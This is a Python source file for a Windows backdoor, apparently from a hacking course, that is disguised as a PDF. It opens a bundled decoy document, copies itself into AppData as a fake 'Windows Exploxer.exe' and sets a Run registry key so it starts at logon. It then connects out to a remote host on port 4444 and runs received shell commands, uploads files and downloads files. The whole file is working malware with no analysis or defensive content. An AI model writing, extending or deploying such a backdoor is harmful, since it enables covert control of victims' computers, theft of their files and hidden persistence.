#!/usr/bin/env python

import socket, subprocess, os, json, base64, sys, shutil

class Backdoor:
    def __init__(self, ip, port):
        self.become_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port)) 

    def become_persistent(self):
        evil_file_location = os.environ["appdata"] + "\\Windows Exploxer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "'+ evil_file_location + '"',shell=True)

    def reliable_send(self, data):
        json_data = json.dumps(data, indent=2)
        json_data = json_data.encode('utf-8')
        self.connection.send(json_data)
        
    def reliable_receive(self):
        data = b""
        while True:
            try:
                data = data + self.connection.recv(2048)
                return json.loads(data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

    def change_working_directory(self, path):
        os.chdir(path)
        return b"[+] Changing working directory to " + bytes(path, 'utf-8')

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful."
    def run(self):
        while True:  
            command = self.reliable_receive()  
            #command = str(command, "utf-8")     
            #command = command.split()   
            try:
                if command[0]=="exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] =="cd" and len(command) > 1:   
                    command_result = self.change_working_directory(command[1])   
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                    command_result = bytes(command_result, 'utf-8')
                else:
                    command_result = self.execute_system_command(command)
                #command_result = bytes(str(command_result), "utf-8")
                #self.connection.send(command_result)
            except Exception:
                command_result = b"[-] Error during command execution."
            self.reliable_send(command_result.decode('utf-8'))  

filename = sys._MEIPASS + "\pun.pdf"
subprocess.Popen(filename, shell=True)

try:           
    my_backdoor = Backdoor("192.168.75.128", 4444)
    my_backdoor.run()
except Exception:
    sys.exit()